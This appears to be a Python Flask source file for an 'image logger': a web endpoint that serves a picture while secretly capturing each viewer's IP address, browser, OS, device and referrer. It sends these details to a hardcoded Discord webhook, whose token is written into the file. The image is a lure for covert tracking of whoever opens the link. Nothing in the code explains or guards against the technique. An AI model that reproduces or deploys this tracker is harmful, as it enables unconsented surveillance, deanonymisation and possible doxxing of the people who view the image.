from flask import Flask, request, make_response
import httpagentparser
import requests
import datetime

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518983533526257777/LoIZ6BCnbo1pvKd2Yj0gmOzo-AZfpwSLergw8OmHtfNNgLB6N7bmJ2ahgOwi_m9kN9Q-"
IMAGE_URL = "https://i.pinimg.com/236x/6a/3d/33/6a3d336840b6a2d91efde0ff77f038e9.jpg"

def fetch_image():
    try:
        r = requests.get(IMAGE_URL, timeout=10)
        r.raise_for_status()
        return r.content, r.headers.get('Content-Type', 'image/jpeg')
    except:
        return b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;', 'image/gif'

@app.route('/api/image', methods=['GET'])
def serve_image():
    ip = request.remote_addr or request.headers.get('X-Forwarded-For', 'Unknown')
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'No referrer')
    timestamp = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    
    try:
        parsed = httpagentparser.detect(user_agent)
        browser = parsed.get('browser', {}).get('name', 'Unknown')
        os_name = parsed.get('os', {}).get('name', 'Unknown')
        device = parsed.get('device', 'Unknown')
    except:
        browser = os_name = device = "Unknown"

    # Rich embed with emojis
    embed = {
        "title": "🔥 Image Logger Triggered",
        "color": 0xff00ff,
        "description": "🖼️ Image viewed successfully",
        "thumbnail": {"url": IMAGE_URL},
        "fields": [
            {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
            {"name": "🔍 Browser", "value": f"`{browser}`", "inline": True},
            {"name": "💻 OS / Device", "value": f"`{os_name} - {device}`", "inline": True},
            {"name": "⏰ Timestamp", "value": timestamp, "inline": False},
            {"name": "🔗 Referrer", "value": f"`{referrer}`", "inline": False},
            {"name": "📌 Note", "value": "Location permission requires browser JS. Pure image mode active.", "inline": False}
        ],
        "footer": {"text": "Image Logger • Vercel"}
    }

    payload = {
        "content": "**🔔 New Image View Detected**",
        "embeds": [embed]
    }

    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except:
        pass

    image_data, content_type = fetch_image()
    response = make_response(image_data)
    response.headers.set('Content-Type', content_type)
    response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
    response.headers.set('Pragma', 'no-cache')
    return response

if __name__ == '__main__':
    app.run()
